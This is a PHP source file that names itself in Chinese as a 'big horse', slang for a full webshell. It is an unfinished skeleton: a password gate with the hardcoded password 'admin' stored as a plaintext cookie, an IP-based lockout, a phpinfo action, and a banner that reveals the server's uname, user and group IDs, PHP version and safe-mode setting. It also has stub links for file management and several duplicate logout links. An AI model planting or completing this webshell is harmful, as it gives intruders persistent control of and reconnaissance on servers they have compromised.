<?php
session_start();
define('pass', 'admin');
$op = @$_GET['op'];
$op = $op ? $op : 'home';
$dis_funcs = get_cfg_var('disable_functions');
define('IS_PHPINFO',(!preg_match('/phpinfo/',$dis_funcs) ? 1 : 0));
!@$writeable && $writeable = 'php,cgi,pl,asp,inc,js,html,htm,jsp';
$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
$ip = ip();
Bl_ip();
if (empty(@$_SESSION[$ip])) {
    $_SESSION[$ip][] = array(0,time());
}
if (empty($_COOKIE['passwd'])) {
    if (empty($_POST['auth'])) login(4);
    if (empty($_POST['passwd'])) login(0);
    if (@$_POST['passwd'] == pass) {
        setcookie('passwd', pass, time() + 3600);
        $_SESSION['timeout'] = time() + 900;
    } elseif ( @$_POST['passwd'] != pass) {
        login(1);
    }
}else{
    if (@$_COOKIE['passwd'] != pass) login(2);
    if($_SESSION['timeout'] < time()){
        setcookie('passwd', '', time() - 3600);
        unset($_SESSION['timeout']);
        login(2);
    }else{
        $_SESSION['timeout'] = time() + 900;
        setcookie('passwd', pass, time() + 3600);
    }
}
if ($op == 'phpinfo()') {
    if (IS_PHPINFO) {
        phpinfo();
        exit;
    }else{
        $errmesage = '改操作没权限';
    }
}
if ($op == 'logout'){
    setcookie('passwd', '', time() - 3600);
    login(4);
}
function Bl_ip(){
    global $ip;
    if (@$_SESSION['Bl_'.$ip]) {
        if (get_time(time(),$_SESSION['Bl_'.$ip]) < 10){
            login(3);
        }else{
            unset($_SESSION['Bl_' . $ip]);
        }
    }
}
function get_time($end_time,$start_time){
    $end = explode('-',@date('i-s', $end_time));
    $start = explode('-',@date('i-s', $start_time));

    return ($end[0] - $start[0])* 60  + $end[1] - $start[1];

}
function login($err){
    global $ip;
    $file = basename(__FILE__);
    global $_SESSION;
    $errs = array('密码不能为空','密码错误 请重新输入','验证过期 请重新验证','访问频繁 请稍后再试','');
    $error = $errs[$err];
    if ($err == 1 or $err == 0) {
        $num = count($_SESSION[$ip]) - 1;
        list($count,$time) = $_SESSION[$ip][$num];
        $count ++;
        $_SESSION[$ip][] = array($count, time());
        if (get_time($_SESSION[$ip][$num][1],$_SESSION[$ip][0][1]) >= 5) {
            if($_SESSION[$ip][$num][0] - $_SESSION[$ip][0][0] > 4){
                unset($_SESSION[$ip]);
                $_SESSION['Bl_'.$ip] = time();
                $error =  $errs[3];
            }else{
                unset($_SESSION[$ip]);
            }
        }
    }
    echo <<<EOT
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<title>xyz</title>
</head>
<body style="text-align:center" bgcolor="black">
<p style="color:white">小Y_PHP大马</p>
EOT;
    if ($err !== ''){
        echo<<<EOT
        <span style="color: red;">{$error}</span>
EOT;
    }
echo <<<EOT
<form action="{$file}" method="post">
<span style="color: white;">请输入密码：</span>  <input name="auth" type="hidden" value="1"><input type="text"  name="passwd" style="text-align:center; "  > <input type="submit" name="提交">
</form>
</body>
</html>
EOT;
    exit();
}

function ip() {
    if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
        $ip = getenv('HTTP_CLIENT_IP');
    } elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
        $ip = getenv('HTTP_X_FORWARDED_FOR');
    } elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
        $ip = getenv('REMOTE_ADDR');
    } elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return preg_match ( '/[\d\.]{7,15}/', $ip, $matches ) ? $matches [0] : '';
}

function m($msg){
    echo '<div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;">';
    echo $msg;
    echo '</div>';
}
?>
<html>
<head>
    <meta http-equiv="content-type" content="text/html" charset="gb2312">
    <title><?php echo $op.'-'.$_SERVER['HTTP_HOST'];?></title>
<body style="margin:0;table-layout:fixed; word-break:break-all">
<?php
if (!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
}else{
    $uid = @posix_getpwuid(@posix_getuid());
    $gid = @posix_getgrgid(@posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $gid = $gid['gid'];
    $group = $gid['name'];
}
?>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
    <tr> <span style="float:right;"><?php echo @php_uname()?>/user: <?php echo $uid.'('.$user.')/group'.$gid.'('.$group.')';?></span></tr>
    <tr>
        <td style="color: red;">
            <span style="float: right;">PHP<?php echo PHP_VERSION;?>/safe mode:<?php echo getcfg('safe_mode');?></span>
            <a href="<?php echo basename($self).'?op=logout'?>">logout</a>
            <a href="<?php echo basename($self).'?op=file'?>">filemange</a>
            <a href="<?php echo basename($self).'?op=logout'?>">logout</a>
            <a href="<?php echo basename($self).'?op=logout'?>">logout</a>
            <a href="<?php echo basename($self).'?op=logout'?>">logout</a>
            <a href="<?php echo basename($self).'?op=logout'?>">logout</a>
        </td>
    </tr>
</table>
</body>
</html>

<?php
function getcfg($varname){
    $result = get_cfg_var($varname);
    if ($result == 0) {
        return 'no';
    } elseif ($result == 1) {
        return 'yes';
    }else{
        return $result;
    }

}
?>
